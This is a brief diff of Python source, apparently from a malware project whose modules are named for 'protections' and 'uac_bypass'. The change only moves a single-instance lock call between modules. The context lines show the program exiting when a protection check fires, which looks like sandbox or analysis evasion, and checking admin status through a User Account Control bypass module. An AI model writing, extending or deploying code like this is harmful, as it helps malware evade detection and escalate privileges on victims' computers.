@@ -10,7 +10,7 @@ from urllib.request import urlopen
 if pysilon_protections.protection_check():
     os._exit(0)
 
-if pysilon_misc.single_instance_lock():
+if pysilon_protections.single_instance_lock():
     os._exit(0)
 
 if not uac_bypass.IsAdmin():
